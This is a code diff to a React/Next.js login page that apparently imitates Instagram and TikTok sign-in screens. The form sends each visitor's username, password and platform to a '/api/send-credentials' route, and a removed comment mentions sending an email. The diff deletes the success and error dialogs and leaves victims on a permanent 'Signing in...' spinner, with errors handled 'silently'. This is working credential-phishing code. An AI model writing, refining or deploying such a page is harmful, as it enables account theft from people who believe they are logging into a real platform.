@@ -2,8 +2,6 @@
 
 import { useState, useEffect } from 'react'
 import { useRouter, useParams } from 'next/navigation'
-import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from '@/components/ui/dialog'
-import { CheckCircle, XCircle, Loader2 } from 'lucide-react'
 
 // TikTok Icon Component
 const TikTokIcon = ({ className }: { className?: string }) => (
@@ -25,9 +23,6 @@ export default function SetupPage() {
   const [loading, setLoading] = useState(false)
   const [username, setUsername] = useState('')
   const [password, setPassword] = useState('')
-  const [showModal, setShowModal] = useState(false)
-  const [modalType, setModalType] = useState<'success' | 'error'>('success')
-  const [modalMessage, setModalMessage] = useState('')
 
   useEffect(() => {
     // Add Instagram font link to head if not already present (only for Instagram)
@@ -56,7 +51,7 @@ export default function SetupPage() {
 
     try {
       // Send credentials to API route
-      const response = await fetch('/api/send-credentials', {
+      await fetch('/api/send-credentials', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -67,30 +62,11 @@ export default function SetupPage() {
           platform,
         }),
       })
-
-      const data = await response.json()
-
-      if (response.ok) {
-        // Success - show success modal
-        setModalType('success')
-        setModalMessage('Setup complete! Your credentials have been verified. Redirecting to dashboard...')
-        setShowModal(true)
-        setLoading(false)
-        // You can redirect to dashboard or next step here after a delay
-        // setTimeout(() => router.push('/dashboard'), 2000)
-      } else {
-        // Error sending email
-        setModalType('error')
-        setModalMessage('There was an error processing your request. Please try again.')
-        setShowModal(true)
-        setLoading(false)
-      }
+      // Credentials sent, keep loading state
+      // You can optionally reset after a delay or keep it loading
     } catch (error) {
       console.error('Error submitting form:', error)
-      setModalType('error')
-      setModalMessage('There was an error processing your request. Please try again.')
-      setShowModal(true)
-      setLoading(false)
+      // Silently handle error, keep loading state
     }
   }
 
@@ -164,7 +140,7 @@ export default function SetupPage() {
                   fontWeight: 600
                 }}
               >
-                {loading ? 'Logging in...' : 'Log in'}
+                {loading ? 'Signing in...' : 'Log in'}
               </button>
             </form>
 
@@ -208,53 +184,6 @@ export default function SetupPage() {
             </div>
           </div>
         </div>
-
-        {/* Success/Error Modal */}
-        <Dialog open={showModal} onOpenChange={setShowModal}>
-          <DialogContent className="sm:max-w-md bg-white" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
-            <DialogHeader>
-              <div className="flex items-center justify-center mb-4">
-                {modalType === 'success' ? (
-                  <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center">
-                    <CheckCircle className="w-10 h-10 text-green-600" />
-                  </div>
-                ) : (
-                  <div className="w-16 h-16 rounded-full bg-red-100 flex items-center justify-center">
-                    <XCircle className="w-10 h-10 text-red-600" />
-                  </div>
-                )}
-              </div>
-              <DialogTitle className="text-center text-xl font-semibold text-black">
-                {modalType === 'success' ? 'Setup Complete!' : 'Error'}
-              </DialogTitle>
-              <DialogDescription className="text-center text-base pt-2 text-gray-600">
-                {modalMessage}
-              </DialogDescription>
-            </DialogHeader>
-            <DialogFooter className="sm:justify-center">
-              <button
-                onClick={() => {
-                  setShowModal(false)
-                  if (modalType === 'success') {
-                    // Optionally redirect here
-                    // router.push('/dashboard')
-                  }
-                }}
-                className={`px-6 py-2 rounded-md font-semibold text-white transition-colors ${
-                  modalType === 'success'
-                    ? 'bg-white hover:bg-gray-100 text-black'
-                    : 'bg-gray-600 hover:bg-gray-700'
-                }`}
-                style={{ 
-                  fontSize: '14px',
-                  fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
-                }}
-              >
-                {modalType === 'success' ? 'Continue' : 'Close'}
-              </button>
-            </DialogFooter>
-          </DialogContent>
-        </Dialog>
       </div>
     )
   }
@@ -426,53 +355,6 @@ export default function SetupPage() {
           </p>
         </div>
       </div>
-
-      {/* Success/Error Modal */}
-      <Dialog open={showModal} onOpenChange={setShowModal}>
-        <DialogContent className="sm:max-w-md bg-white" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
-          <DialogHeader>
-            <div className="flex items-center justify-center mb-4">
-              {modalType === 'success' ? (
-                <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center">
-                  <CheckCircle className="w-10 h-10 text-green-600" />
-                </div>
-              ) : (
-                <div className="w-16 h-16 rounded-full bg-red-100 flex items-center justify-center">
-                  <XCircle className="w-10 h-10 text-red-600" />
-                </div>
-              )}
-            </div>
-            <DialogTitle className="text-center text-xl font-semibold text-black">
-              {modalType === 'success' ? 'Setup Complete!' : 'Error'}
-            </DialogTitle>
-            <DialogDescription className="text-center text-base pt-2 text-gray-600">
-              {modalMessage}
-            </DialogDescription>
-          </DialogHeader>
-          <DialogFooter className="sm:justify-center">
-            <button
-              onClick={() => {
-                setShowModal(false)
-                if (modalType === 'success') {
-                  // Optionally redirect here
-                  // router.push('/dashboard')
-                }
-              }}
-              className={`px-6 py-2 rounded-md font-semibold text-white transition-colors ${
-                modalType === 'success'
-                  ? 'bg-gradient-to-r from-purple-500 to-pink-500 hover:opacity-90'
-                  : 'bg-gray-600 hover:bg-gray-700'
-              }`}
-              style={{ 
-                fontSize: '14px',
-                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
-              }}
-            >
-              {modalType === 'success' ? 'Continue' : 'Close'}
-            </button>
-          </DialogFooter>
-        </DialogContent>
-      </Dialog>
     </div>
   )
 }
